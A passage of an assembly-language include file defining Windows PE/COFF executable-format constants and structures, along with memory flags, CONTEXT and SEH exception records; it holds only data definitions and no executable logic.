 IMAGE_SYM_TYPE_MOE                   EQU 000Bh  ; member of enumeration.
 IMAGE_SYM_TYPE_BYTE                  EQU 000Ch  ;
 IMAGE_SYM_TYPE_WORD                  EQU 000Dh  ;
 IMAGE_SYM_TYPE_UINT                  EQU 000Eh  ;
 IMAGE_SYM_TYPE_DWORD                 EQU 000Fh  ;
 IMAGE_SYM_TYPE_PCODE                 EQU 8000h  ;

 IMAGE_SYM_DTYPE_NULL                EQU 0       ; no derived type.
 IMAGE_SYM_DTYPE_POINTER             EQU 1       ; pointer.
 IMAGE_SYM_DTYPE_FUNCTION            EQU 2       ; function.
 IMAGE_SYM_DTYPE_ARRAY               EQU 3       ; array.


 IMAGE_SYM_CLASS_END_OF_FUNCTION     EQU -1
 IMAGE_SYM_CLASS_NULL                EQU 0000h
 IMAGE_SYM_CLASS_AUTOMATIC           EQU 0001h
 IMAGE_SYM_CLASS_EXTERNAL            EQU 0002h
 IMAGE_SYM_CLASS_STATIC              EQU 0003h
 IMAGE_SYM_CLASS_REGISTER            EQU 0004h
 IMAGE_SYM_CLASS_EXTERNAL_DEF        EQU 0005h
 IMAGE_SYM_CLASS_LABEL               EQU 0006h
 IMAGE_SYM_CLASS_UNDEFINED_LABEL     EQU 0007h
 IMAGE_SYM_CLASS_MEMBER_OF_STRUCT    EQU 0008h
 IMAGE_SYM_CLASS_ARGUMENT            EQU 0009h
 IMAGE_SYM_CLASS_STRUCT_TAG          EQU 000Ah
 IMAGE_SYM_CLASS_MEMBER_OF_UNION     EQU 000Bh
 IMAGE_SYM_CLASS_UNION_TAG           EQU 000Ch
 IMAGE_SYM_CLASS_TYPE_DEFINITION     EQU 000Dh
 IMAGE_SYM_CLASS_UNDEFINED_STATIC    EQU 000Eh
 IMAGE_SYM_CLASS_ENUM_TAG            EQU 000Fh
 IMAGE_SYM_CLASS_MEMBER_OF_ENUM      EQU 0010h
 IMAGE_SYM_CLASS_REGISTER_PARAM      EQU 0011h
 IMAGE_SYM_CLASS_BIT_FIELD           EQU 0012h

 IMAGE_SYM_CLASS_FAR_EXTERNAL        EQU 0044h

 IMAGE_SYM_CLASS_BLOCK               EQU 0064h
 IMAGE_SYM_CLASS_FUNCTION            EQU 0065h
 IMAGE_SYM_CLASS_END_OF_STRUCT       EQU 0066h
 IMAGE_SYM_CLASS_FILE                EQU 0067h
 IMAGE_SYM_CLASS_SECTION             EQU 0068h
 IMAGE_SYM_CLASS_WEAK_EXTERNAL       EQU 0069h


 N_BTMASK                            EQU 000Fh
 N_TMASK                             EQU 0030h
 N_TMASK1                            EQU 00C0h
 N_TMASK2                            EQU 00F0h
 N_BTSHFT                            EQU 4
 N_TSHIFT                            EQU 2

 IMAGE_SIZEOF_AUX_SYMBOL             EQU 18

 IMAGE_COMDAT_SELECT_NODUPLICATES    EQU 1
 IMAGE_COMDAT_SELECT_ANY             EQU 2
 IMAGE_COMDAT_SELECT_SAME_SIZE       EQU 3
 IMAGE_COMDAT_SELECT_EXACT_MATCH     EQU 4
 IMAGE_COMDAT_SELECT_ASSOCIATIVE     EQU 5
 IMAGE_COMDAT_SELECT_LARGEST         EQU 6
 IMAGE_COMDAT_SELECT_NEWEST          EQU 7

 IMAGE_WEAK_EXTERN_SEARCH_NOLIBRARY  EQU 1
 IMAGE_WEAK_EXTERN_SEARCH_LIBRARY    EQU 2
 IMAGE_WEAK_EXTERN_SEARCH_ALIAS      EQU 3

 IMAGE_SIZEOF_RELOCATION         EQU 10

 IMAGE_REL_I386_ABSOLUTE         EQU 0000h  ; Reference is absolute, no relocation is necessary
 IMAGE_REL_I386_DIR16            EQU 0001h  ; Direct 16-bit reference to the symbols virtual address
 IMAGE_REL_I386_REL16            EQU 0002h  ; PC-relative 16-bit reference to the symbols virtual address
 IMAGE_REL_I386_DIR32            EQU 0006h  ; Direct 32-bit reference to the symbols virtual address
 IMAGE_REL_I386_DIR32NB          EQU 0007h  ; Direct 32-bit reference to the symbols virtual address, base not included
 IMAGE_REL_I386_SEG12            EQU 0009h  ; Direct 16-bit reference to the segment-selector bits of a 32-bit virtual address
 IMAGE_REL_I386_SECTION          EQU 000Ah
 IMAGE_REL_I386_SECREL           EQU 000Bh
 IMAGE_REL_I386_REL32            EQU 0014h  ; PC-relative 32-bit reference to the symbols virtual address

 IMAGE_SIZEOF_LINENUMBER               EQU 6
 IMAGE_SIZEOF_BASE_RELOCATION          EQU 8

 IMAGE_REL_BASED_ABSOLUTE              EQU 0
 IMAGE_REL_BASED_HIGH                  EQU 1
 IMAGE_REL_BASED_LOW                   EQU 2
 IMAGE_REL_BASED_HIGHLOW               EQU 3
 IMAGE_REL_BASED_HIGHADJ               EQU 4
 IMAGE_REL_BASED_MIPS_JMPADDR          EQU 5
 IMAGE_REL_BASED_SECTION               EQU 6
 IMAGE_REL_BASED_REL32                 EQU 7

 IMAGE_REL_BASED_MIPS_JMPADDR16        EQU 9
 IMAGE_REL_BASED_IA64_IMM64            EQU 9
 IMAGE_REL_BASED_DIR64                 EQU 10
 IMAGE_REL_BASED_HIGH3ADJ              EQU 11

 IMAGE_ORDINAL_FLAG                    EQU 80000000h

 IMAGE_RESOURCE_NAME_IS_STRING         EQU 80000000h
 IMAGE_RESOURCE_DATA_IS_DIRECTORY      EQU 80000000h

 IMAGE_DEBUG_TYPE_UNKNOWN          EQU 0
 IMAGE_DEBUG_TYPE_COFF             EQU 1
 IMAGE_DEBUG_TYPE_CODEVIEW         EQU 2
 IMAGE_DEBUG_TYPE_FPO              EQU 3
 IMAGE_DEBUG_TYPE_MISC             EQU 4
 IMAGE_DEBUG_TYPE_EXCEPTION        EQU 5
 IMAGE_DEBUG_TYPE_FIXUP            EQU 6
 IMAGE_DEBUG_TYPE_OMAP_TO_SRC      EQU 7
 IMAGE_DEBUG_TYPE_OMAP_FROM_SRC    EQU 8
 IMAGE_DEBUG_TYPE_BORLAND          EQU 9
 IMAGE_DEBUG_TYPE_RESERVED10       EQU 10

 IMAGE_DEBUG_MISC_EXENAME    EQU 1

 IMAGE_SEPARATE_DEBUG_SIGNATURE  EQU 04944h

 IMAGE_SEPARATE_DEBUG_FLAGS_MASK EQU 8000h
 IMAGE_SEPARATE_DEBUG_MISMATCH   EQU 8000h  ; when DBG was updated, the

;ƒƒƒƒƒƒ¥ MEMORY √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 ; G = GLOBAL
 ; L = LOCAL  (NB. IN WIN95/98/NT GLOBAL=LOCAL)

 GMEM_FIXED          EQU 0000h
 GMEM_MOVEABLE       EQU 0002h
 GMEM_NOCOMPACT      EQU 0010h
 GMEM_NODISCARD      EQU 0020h
 GMEM_ZEROINIT       EQU 0040h
 GMEM_MODIFY         EQU 0080h
 GMEM_DISCARDABLE    EQU 0100h
 GMEM_NOT_BANKED     EQU 1000h
 GMEM_SHARE          EQU 2000h
 GMEM_DDESHARE       EQU 2000h
 GMEM_NOTIFY         EQU 4000h
 GMEM_LOWER          EQU GMEM_NOT_BANKED
 GMEM_VALID_FLAGS    EQU 7F72h
 GMEM_INVALID_HANDLE EQU 8000h

 GHND                EQU (GMEM_MOVEABLE OR GMEM_ZEROINIT)
 GPTR                EQU (GMEM_FIXED OR GMEM_ZEROINIT)

 GMEM_DISCARDED      EQU 4000h
 GMEM_LOCKCOUNT      EQU 00FFh

 LMEM_FIXED          EQU 0000h
 LMEM_MOVEABLE       EQU 0002h
 LMEM_NOCOMPACT      EQU 0010h
 LMEM_NODISCARD      EQU 0020h
 LMEM_ZEROINIT       EQU 0040h
 LMEM_MODIFY         EQU 0080h
 LMEM_DISCARDABLE    EQU 0F00h
 LMEM_VALID_FLAGS    EQU 0F72h
 LMEM_INVALID_HANDLE EQU 8000h

 LHND                EQU (LMEM_MOVEABLE OR LMEM_ZEROINIT)
 LPTR                EQU (LMEM_FIXED OR LMEM_ZEROINIT)

 NONZEROLHND         EQU LMEM_MOVEABLE
 NONZEROLPTR         EQU LMEM_FIXED

 LMEM_DISCARDED      EQU 4000h
 LMEM_LOCKCOUNT      EQU 00FFh


;ÕÕÕÕÕÕµ STRUCTURES ∆ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕ

IMAGE_DOS_HEADER STRUC            ; DOS .EXE header
    MZ_magic      DW ?            ; Magic number
    MZ_cblp       DW ?            ; Bytes on last page of file
    MZ_cp         DW ?            ; Pages in file
    MZ_crlc       DW ?            ; Relocations
    MZ_cparhdr    DW ?            ; Size of header in paragraphs
    MZ_minalloc   DW ?            ; Minimum extra paragraphs needed
    MZ_maxalloc   DW ?            ; Maximum extra paragraphs needed
    MZ_ss         DW ?            ; Initial (relative) SS value
    MZ_sp         DW ?            ; Initial SP value
    MZ_csum       DW ?            ; Checksum
    MZ_ip         DW ?            ; Initial IP value
    MZ_cs         DW ?            ; Initial (relative) CS value
    MZ_lfarlc     DW ?            ; File address of relocation table
    MZ_ovno       DW ?            ; Overlay number
    MZ_res        DW 4 DUP(?)     ; Reserved words
    MZ_oemid      DW ?            ; OEM identifier (for MZ_oeminfo)
    MZ_oeminfo    DW ?            ; OEM information; MZ_oemid specific
    MZ_res2       DW 10 DUP(?)    ; Reserved words
    MZ_lfanew     DD ?            ; File address of new exe header
IMAGE_DOS_HEADER ENDS             ;

IMAGE_VXD_HEADER STRUC            ; Windows VXD header
    VXD_magic         DW ?        ; Magic number
    VXD_border        DB ?        ; The byte ordering for the VXD
    VXD_worder        DB ?        ; The word ordering for the VXD
    VXD_level         DD ?        ; The EXE format level for now = 0
    VXD_cpu           DW ?        ; The CPU type
    VXD_os            DW ?        ; The OS type
    VXD_ver           DD ?        ; Module version
    VXD_mflags        DD ?        ; Module flags
    VXD_mpages        DD ?        ; Module # pages
    VXD_startobj      DD ?        ; Object # for instruction pointer
    VXD_eip           DD ?        ; Extended instruction pointer
    VXD_stackobj      DD ?        ; Object # for stack pointer
    VXD_esp           DD ?        ; Extended stack pointer
    VXD_pagesize      DD ?        ; VXD page size
    VXD_lastpagesize  DD ?        ; Last page size in VXD
    VXD_fixupsize     DD ?        ; Fixup section size
    VXD_fixupsum      DD ?        ; Fixup section checksum
    VXD_ldrsize       DD ?        ; Loader section size
    VXD_ldrsum        DD ?        ; Loader section checksum
    VXD_objtab        DD ?        ; Object table offset
    VXD_objcnt        DD ?        ; Number of objects in module
    VXD_objmap        DD ?        ; Object page map offset
    VXD_itermap       DD ?        ; Object iterated data map offset
    VXD_rsrctab       DD ?        ; Offset of Resource Table
    VXD_rsrccnt       DD ?        ; Number of resource entries
    VXD_restab        DD ?        ; Offset of resident name table
    VXD_enttab        DD ?        ; Offset of Entry Table
    VXD_dirtab        DD ?        ; Offset of Module Directive Table
    VXD_dircnt        DD ?        ; Number of module directives
    VXD_fpagetab      DD ?        ; Offset of Fixup Page Table
    VXD_frectab       DD ?        ; Offset of Fixup Record Table
    VXD_impmod        DD ?        ; Offset of Import Module Name Table
    VXD_impmodcnt     DD ?        ; Number of entries in Import Module Name Table
    VXD_impproc       DD ?        ; Offset of Import Procedure Name Table
    VXD_pagesum       DD ?        ; Offset of Per-Page Checksum Table
    VXD_datapage      DD ?        ; Offset of Enumerated Data Pages
    VXD_preload       DD ?        ; Number of preload pages
    VXD_nrestab       DD ?        ; Offset of Non-resident Names Table
    VXD_cbnrestab     DD ?        ; Size of Non-resident Name Table
    VXD_nressum       DD ?        ; Non-resident Name Table Checksum
    VXD_autodata      DD ?        ; Object # for automatic data object
    VXD_debuginfo     DD ?        ; Offset of the debugging information
    VXD_debuglen      DD ?        ; The length of the debugging info. in bytes
    VXD_instpreload   DD ?        ;  Number of instance pages in preload section of VXD file
    VXD_instdemand    DD ?        ;  Number of instance pages in demand load section of VXD file
    VXD_heapsize      DD ?        ;  Size of heap - for 16-bit apps
    VXD_res3          DB 12 DUP(?); Reserved words
    VXD_winresoff     DD ?        ;
    VXD_winreslen     DD ?        ;
    VXD_devid         DW ?        ; Device ID for VxD
    VXD_ddkver        DW ?        ; DDK version for VxD
IMAGE_VXD_HEADER ENDS             ;


;ƒƒƒƒƒƒƒƒƒƒ¥  PORTABLE EXE HEADER STRUCTURES √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

IMAGE_FILE_HEADER STRUC            ; Portable Exe File
    PE_Magic                 DD ?  ;
    Machine                  DW ?  ; Machine type
    NumberOfSections         DW ?  ; Number of sections
    TimeDateStamp            DD ?  ; Date and Time
    PointerToSymbolTable     DD ?  ; Pointer to Symbols
    NumberOfSymbols          DD ?  ; Number of Symbols
    SizeOfOptionalHeader     DW ?  ; Size of Optional Header
    Characteristics          DW ?  ; File characteristics
IMAGE_FILE_HEADER ENDS             ;

IMAGE_FILE_HEADER_SIZE       EQU SIZE IMAGE_FILE_HEADER

IMAGE_DATA_DIRECTORY STRUC                         ; Image data directory
    DD_VirtualAddress DD ?                         ; Virtual address
    DD_Size           DD ?                         ; Virtual size
IMAGE_DATA_DIRECTORY ENDS                          ;

IMAGE_DIRECTORY_ENTRIES STRUC                      ; All directories
    DE_Export           IMAGE_DATA_DIRECTORY    ?  ;
    DE_Import           IMAGE_DATA_DIRECTORY    ?  ;
    DE_Resource         IMAGE_DATA_DIRECTORY    ?  ;
    DE_Exception        IMAGE_DATA_DIRECTORY    ?  ;
    DE_Security         IMAGE_DATA_DIRECTORY    ?  ;
    DE_BaseReloc        IMAGE_DATA_DIRECTORY    ?  ;
    DE_Debug            IMAGE_DATA_DIRECTORY    ?  ;
    DE_Copyright        IMAGE_DATA_DIRECTORY    ?  ;
    DE_GlobalPtr        IMAGE_DATA_DIRECTORY    ?  ;
    DE_TLS              IMAGE_DATA_DIRECTORY    ?  ;
    DE_LoadConfig       IMAGE_DATA_DIRECTORY    ?  ;
    DE_BoundImport      IMAGE_DATA_DIRECTORY    ?  ;
    DE_IAT              IMAGE_DATA_DIRECTORY    ?  ;
IMAGE_DIRECTORY_ENTRIES ENDS                       ;

IMAGE_OPTIONAL_HEADER STRUC                        ; Optional Header
    OH_Magic                        DW ?           ; Magic word
    OH_MajorLinkerVersion           DB ?           ; Major Linker version
    OH_MinorLinkerVersion           DB ?           ; Minor Linker version
    OH_SizeOfCode                   DD ?           ; Size of code section
    OH_SizeOfInitializedData        DD ?           ; Initialized Data
    OH_SizeOfUninitializedData      DD ?           ; Uninitialized Data
    OH_AddressOfEntryPoint          DD BYTE PTR ?  ; Initial EIP
    OH_BaseOfCode                   DD BYTE PTR ?  ; Code Virtual Address
    OH_BaseOfData                   DD BYTE PTR ?  ; Data Virtual Address
    OH_ImageBase                    DD BYTE PTR ?  ; Base of image
    OH_SectionAlignment             DD ?           ; Section Alignment
    OH_FileAlignment                DD ?           ; File Alignment
    OH_MajorOperatingSystemVersion  DW ?           ; Major OS
    OH_MinorOperatingSystemVersion  DW ?           ; Minor OS
    OH_MajorImageVersion            DW ?           ; Major Image version
    OH_MinorImageVersion            DW ?           ; Minor Image version
    OH_MajorSubsystemVersion        DW ?           ; Major Subsys version
    OH_MinorSubsystemVersion        DW ?           ; Minor Subsys version
    OH_Win32VersionValue            DD ?           ; win32 version
    OH_SizeOfImage                  DD ?           ; Size of image
    OH_SizeOfHeaders                DD ?           ; Size of Header
    OH_CheckSum                     DD ?           ; unused
    OH_Subsystem                    DW ?           ; Subsystem
    OH_DllCharacteristics           DW ?           ; DLL characteristic
    OH_SizeOfStackReserve           DD ?           ; Stack reserve
    OH_SizeOfStackCommit            DD ?           ; Stack commit
    OH_SizeOfHeapReserve            DD ?           ; Heap reserve
    OH_SizeOfHeapCommit             DD ?           ; Heap commit
    OH_LoaderFlags                  DD ?           ; Loader flags
    OH_NumberOfRvaAndSizes          DD ?           ; Number of directories
                                    UNION          ; directory entries
    OH_DataDirectory                IMAGE_DATA_DIRECTORY\
                                    IMAGE_NUMBEROF_DIRECTORY_ENTRIES DUP (?)
    OH_DirectoryEntries             IMAGE_DIRECTORY_ENTRIES ?
                                    ENDS           ;
    ENDS                                           ;

IMAGE_SECTION_HEADER STRUC                  ; Section hdr.
    SH_Name                 DB IMAGE_SIZEOF_SHORT_NAME DUP(?) ; name
                            UNION           ;
    SH_PhysicalAddress      DD BYTE PTR ?   ; Physical address
    SH_VirtualSize          DD ?            ; Virtual size
                            ENDS            ;
    SH_VirtualAddress       DD BYTE PTR ?   ; Virtual address
    SH_SizeOfRawData        DD ?            ; Raw data size
    SH_PointerToRawData     DD BYTE PTR ?   ; pointer to raw data
    SH_PointerToRelocations DD BYTE PTR ?   ; ...
    SH_PointerToLinenumbers DD BYTE PTR ?   ; ...... not really used
    SH_NumberOfRelocations  DW ?            ; ....
    SH_NumberOfLinenumbers  DW ?            ; ..
    SH_Characteristics      DD ?            ; flags
IMAGE_SECTION_HEADER ENDS                   ;

; Relocation format.

IMAGE_RELOCATION_DATA   RECORD {            ; relocation data
    RD_RelocType        :4                  ; type
    RD_RelocOffset      :12    }            ; address

IMAGE_BASE_RELOCATION   STRUC               ; base relocation
    BR_VirtualAddress   DD    ?             ; Virtual address
    BR_SizeOfBlock      DD    ?             ; size of relocation block
    BR_TypeOffset       IMAGE_RELOCATION_DATA 1 DUP (?) ; relocation data
IMAGE_BASE_RELOCATION   ENDS                ;

IMAGE_LINENUMBER STRUC         ; Line numbers
                        UNION  ;
    LN_SymbolTableIndex DD ?   ; Sym. tbl. index of func. name if Linenr is 0.
    LN_VirtualAddress   DD ?   ; Virtual address of line number.
                        ENDS   ;
    Linenumber          DW ?   ; Line number.
IMAGE_LINENUMBER ENDS          ;

IMAGE_EXPORT_DIRECTORY STRUC                    ; Export Directory type
    ED_Characteristics        DD ?              ; Flags
    ED_TimeDateStamp          DD ?              ; Date / Time
    ED_MajorVersion           DW ?              ; Major version
    ED_MinorVersion           DW ?              ; Minor version
    ED_Name                   DD    BYTE PTR ?  ; Ptr to name of exported DLL
                              UNION             ;
    ED_Base                   DD    ?           ; base
    ED_BaseOrdinal            DD    ?           ; base ordinal
                              ENDS              ;
    ED_NumberOfFunctions      DD    ?           ; number of exported funcs.
                              UNION             ;
    ED_NumberOfNames          DD    ?           ; number of exported names
    ED_NumberOfOrdinals       DD    ?           ; number of exported ordinals
                              ENDS              ;
    ED_AddressOfFunctions     DD    DWORD PTR ? ; Ptr to array of function addresses
    ED_AddressOfNames         DD    DWORD PTR ? ; Ptr to array of (function) name addresses
                              UNION             ;
    ED_AddressOfNameOrdinals  DD    WORD PTR ?  ; Ptr to array of name ordinals
    ED_AddressOfOrdinals      DD    WORD PTR ?  ; Ptr to array of ordinals
                              ENDS              ;
IMAGE_EXPORT_DIRECTORY ENDS                     ;

IMAGE_IMPORT_BY_NAME STRUC                      ; Import by name data type
    IBN_Hint DW 0;                              ; Hint entry
    IBN_Name DB 1 DUP (?)                       ; name
IMAGE_IMPORT_BY_NAME ENDS                       ;

IMAGE_THUNK_DATA STRUC                          ; Thunk data
                        UNION                   ;
    TD_AddressOfData    DD IMAGE_IMPORT_BY_NAME PTR ? ; Ptr to IMAGE_IMPORT_BY_NAME structure
    TD_Ordinal          DD ?                    ; Ordinal ORed with IMAGE_ORDINAL_FLAG
    TD_Function         DD BYTE PTR ?           ; Ptr to function (i.e. Function address after program load)
    TD_ForwarderString  DD BYTE PTR ?           ; Ptr to a forwarded API function.
                        ENDS                    ;
IMAGE_THUNK_DATA ENDS                           ;

COMMENT $
; Thread Local Storage

IMAGE_TLS_DIRECTORY32 STRUC
    TLS_StartAddressOfRawData DD BYTE PTR ?
    TLS_EndAddressOfRawData   DD BYTE PTR ?
    TLS_AddressOfIndex        DD BYTE PTR ?
    TLS_AddressOfCallBacks    DD IMAGE_TLS_CALLBACK PTR ?
    TLS_SizeOfZeroFill        DD 0
    TLS_Characteristics       DD 0
    ENDS
    $


IMAGE_IMPORT_DESCRIPTOR STRUC           ; Import descryptor
                          UNION         ;
    ID_Characteristics    DD ?          ; 0 for last null import descriptor
    ID_OriginalFirstThunk DD IMAGE_THUNK_DATA PTR ? ; RVA to original unbound IAT
                          ENDS          ;
    ID_TimeDateStamp      DD ?          ; 0 if not bound,
                                        ; -1 if bound, and real date\time stamp
                                        ;    in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)
                                        ; O.W. date/time stamp of DLL bound to (Old BIND)
    ID_ForwarderChain     DD ?          ; -1 if no forwarders
    ID_Name               DD BYTE PTR ? ; RVA to name of imported DLL
    ID_FirstThunk         DD IMAGE_THUNK_DATA PTR ?  ; RVA to IAT (if bound this IAT has actual addresses)
IMAGE_IMPORT_DESCRIPTOR ENDS

IMAGE_IMPORT_DESCRIPTOR_SIZE EQU SIZE IMAGE_IMPORT_DESCRIPTOR

IMAGE_BOUND_IMPORT_DESCRIPTOR STRUC       ;
    BID_TimeDateStamp               DD ?  ;
    BID_OffsetModuleName            DW ?  ;
    BID_NumberOfModuleForwarderRefs DW ?  ;
IMAGE_BOUND_IMPORT_DESCRIPTOR ENDS        ;

IMAGE_BOUND_FORWARDER_REF STRUC           ;
    BFR_TimeDateStamp     DD ?            ;
    BFR_OffsetModuleName  DW ?            ;
    BFR_Reserved          DW ?            ;
IMAGE_BOUND_FORWARDER_REF ENDS            ;


IMAGE_RESOURCE_DIRECTORY STRUC            ;
    RD_Characteristics      DD ?          ;
    RD_TimeDateStamp        DD ?          ;
    RD_MajorVersion         DW ?          ;
    RD_MinorVersion         DW ?          ;
    RD_NumberOfNamedEntries DW ?          ;
    RD_NumberOfIdEntries    DW ?          ;
IMAGE_RESOURCE_DIRECTORY ENDS             ;
IMAGE_RESOURCE_DIRECTORY_SIZE = SIZE IMAGE_RESOURCE_DIRECTORY

IMAGE_RESOURCE_DIRECTORY_ENTRY STRUC      ;
        UNION                             ;
        STRUC                             ;
        RDE_Offset RECORD  {              ;
        RDE_NameOffset:31                 ;
        RDE_NameIsString:1 }              ;
        ENDS                              ;
        RDE_Name DD ?                     ;
        RDE_Id   DW ?                     ;
        ENDS                              ;
        UNION                             ;
        RDE_OffsetToData DD ?             ;
        STRUC                             ;
        RDE_Directory RECORD     {        ;
        RDE_OffsetToDirectory:31          ;
        RDE_DataIsDirectory:1    }        ;
        ENDS                              ;
        ENDS                              ;
IMAGE_RESOURCE_DIRECTORY_ENTRY ENDS       ;

IMAGE_RESOURCE_DIRECTORY_STRING STRUC     ;
    RDS_Length     DW ?                   ;
    RDS_NameString DB 1 DUP(?)            ;
IMAGE_RESOURCE_DIRECTORY_STRING ENDS      ;

IMAGE_RESOURCE_DIR_STRING_U STRUC         ;
    RDSU_Length     DW ?                  ;
    RDSU_NameString DB 1 DUP (?)          ;
    ENDS                                  ;

IMAGE_RESOURCE_DATA_ENTRY STRUC           ;
    REDE_OffsetToData DD ?                ;
    REDE_Size         DD ?                ;
    REDE_CodePage     DD ?                ;
    REDE_Reserved     DD ?                ;
IMAGE_RESOURCE_DATA_ENTRY ENDS            ;

IMAGE_DEBUG_DIRECTORY STRUC               ;
    DD_Characteristics   DD ?             ;
    DD_TimeDateStamp     DD ?             ;
    DD_MajorVersion      DW ?             ;
    DD_MinorVersion      DW ?             ;
    DD_Type              DD ?             ;
    DD_SizeOfData        DD ?             ;
    DD_AddressOfRawData  DD BYTE PTR ?    ;
    DD_PointerToRawData  DD BYTE PTR ?    ;
IMAGE_DEBUG_DIRECTORY ENDS                ;


IMAGE_COFF_SYMBOLS_HEADER STRUC            ;
    CSH_NumberOfSymbols      DD ?          ;
    CSH_LvaToFirstSymbol     DD BYTE PTR ? ;
    CSH_NumberOfLinenumbers  DD ?          ;
    CSH_LvaToFirstLinenumber DD BYTE PTR ? ;
    CSH_RvaToFirstByteOfCode DD BYTE PTR ? ;
    CSH_RvaToLastByteOfCode  DD BYTE PTR ? ;
    CSH_RvaToFirstByteOfData DD BYTE PTR ? ;
    CSH_RvaToLastByteOfData  DD BYTE PTR ? ;
IMAGE_COFF_SYMBOLS_HEADER ENDS             ;

IMAGE_DEBUG_MISC STRUC         ;
    DM_DataType  DD ?          ; type of misc data, see defines
    DM_Length    DD ?          ; total length of record, rounded to four
    DM_Unicode   DB ?          ; TRUE if data is unicode string
    DM_Reserved  DB 3 DUP(?)   ;
    DM_Data      DB 1 DUP(?)   ; Actual data
IMAGE_DEBUG_MISC ENDS          ;

IMAGE_SEPARATE_DEBUG_HEADER STRUC         ;
    SDH_Signature           DW ?          ;
    SDH_Flags               DW ?          ;
    SDH_Machine             DW ?          ;
    SDH_Characteristics     DW ?          ;
    SDH_TimeDateStamp       DD ?          ;
    SDH_CheckSum            DD ?          ;
    SDH_ImageBase           DD BYTE PTR ? ;
    SDH_SizeOfImage         DD ?          ;
    SDH_NumberOfSections    DD ?          ;
    SDH_ExportedNamesSize   DD ?          ;
    SDH_DebugDirectorySize  DD ?          ;
    SDH_SectionAlignment    DD ?          ;
    SDH_Reserved            DD 2 DUP (?)  ;
IMAGE_SEPARATE_DEBUG_HEADER ENDS          ;

IMPORT_OBJECT_HEADER STRUC         ;
    OH_Sig1           DW ?         ; Must be IMAGE_FILE_MACHINE_UNKNOWN
    OH_Sig2           DW ?         ; Must be IMPORT_OBJECT_HDR_SIG2.
    OH_Version        DW ?         ;
    OH_Machine        DW ?         ;
    OH_TimeDateStamp  DD ?         ; Time/date stamp
    OH_SizeOfData     DD ?         ; particularly useful for incremental links
                      UNION        ;
    OH_Ordinal        DW ?         ; if grf & IMPORT_OBJECT_ORDINAL
    OH_Hint           DW ?         ;
                      ENDS         ;
    OH_ImportType RECORD         { ;
                OH_Type : 2        ; IMPORT_TYPE
                OH_NameType : 3    ; IMPORT_NAME_TYPE
                OH_Reserved : 11 } ; Reserved. Must be zero.
IMPORT_OBJECT_HEADER  ENDS         ;

;ƒƒƒƒƒƒƒƒƒƒ¥  CONTEXT STRUCTURES √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

FLOATING_SAVE_AREA STRUC
    ControlWord   DD ?
    StatusWord    DD ?
    TagWord       DD ?
    ErrorOffset   DD ?
    ErrorSelector DD ?
    DataOffset    DD ?
    DataSelector  DD ?
    RegisterArea  DB SIZE_OF_80387_REGISTERS DUP(?)
    Cr0NpxState   DD ?
FLOATING_SAVE_AREA ENDS

CONTEXT STRUC
    CONTEXT_ContextFlags DD ?
    CONTEXT_Dr0          DD ?
    CONTEXT_Dr1          DD ?
    CONTEXT_Dr2          DD ?
    CONTEXT_Dr3          DD ?
    CONTEXT_Dr6          DD ?
    CONTEXT_Dr7          DD ?

    CONTEXT_FloatSave    FLOATING_SAVE_AREA ?

    CONTEXT_SegGs DD ?
    CONTEXT_SegFs DD ?
    CONTEXT_SegEs DD ?
    CONTEXT_SegDs DD ?

    CONTEXT_Edi DD ?
    CONTEXT_Esi DD ?
    CONTEXT_Ebx DD ?
    CONTEXT_Edx DD ?
    CONTEXT_Ecx DD ?
    CONTEXT_Eax DD ?

    CONTEXT_Ebp    DD ?
    CONTEXT_Eip    DD ?
    CONTEXT_SegCs  DD ?
    CONTEXT_EFlags DD ?
    CONTEXT_Esp    DD ?
    CONTEXT_SegSs  DD ?

    CONTEXT_ExtendedRegisters DB MAXIMUM_SUPPORTED_EXTENSION DUP(?)
CONTEXT ENDS


;ƒƒƒƒƒƒƒƒƒƒ¥  SEH EXCEPTION HANDLER STRUCTURES √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

EXCEPTION_RECORD STRUC
    ER_ExceptionCode        DD ?
    ER_ExceptionFlags       DD ?
    ER_ExceptionRecord      DD EXCEPTION_RECORD PTR ?
    ER_ExceptionAddress     DD BYTE PTR ?
    ER_NumberParameters     DD ?
    ER_ExceptionInformation DD EXCEPTION_MAXIMUM_PARAMETERS DUP(?)
EXCEPTION_RECORD ENDS

EXCEPTION_POINTERS STRUC                          ;
    EP_ExceptionRecord  DD EXCEPTION_RECORD PTR ? ; pointer to exception rec
    EP_ContextRecord    DD CONTEXT PTR ?          ; pointer to a context
EXCEPTION_POINTERS ENDS                           ;

;ƒƒƒƒƒƒƒƒƒƒ¥  MISCLANCELLOUS STRUCTURES √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

MEMORY_BASIC_INFORMATION STRUC            ;
    MBI_BaseAddress       DD BYTE PTR ?   ;
    MBI_AllocationBase    DD BYTE PTR ?   ;
    MBI_AllocationProtect DD ?            ;
    MBI_RegionSize        DD ?            ;
    MBI_State             DD ?            ;
    MBI_Protect           DD ?            ;
    MBI_Type              DD ?            ;
MEMORY_BASIC_INFORMATION ENDS             ;

FILE_NOTIFY_INFORMATION STRUC             ;
    FNI_NextEntryOffset DD ?              ;
    FNI_Action          DD ?              ;
    FNI_FileNameLength  DD ?              ;
    FNI_FileName        DB 1 DUP(?)       ;
FILE_NOTIFY_INFORMATION ENDS              ;

MESSAGE_RESOURCE_ENTRY STRUC              ;
    MRE_Length DW ?                       ;
    MRE_Flags  DW ?                       ;
    MRE_Text   DB 1 DUP(?)                ;
MESSAGE_RESOURCE_ENTRY ENDS               ;

MESSAGE_RESOURCE_BLOCK STRUC              ;
    MRB_LowId           DD ?              ;
    MRB_HighId          DD ?              ;
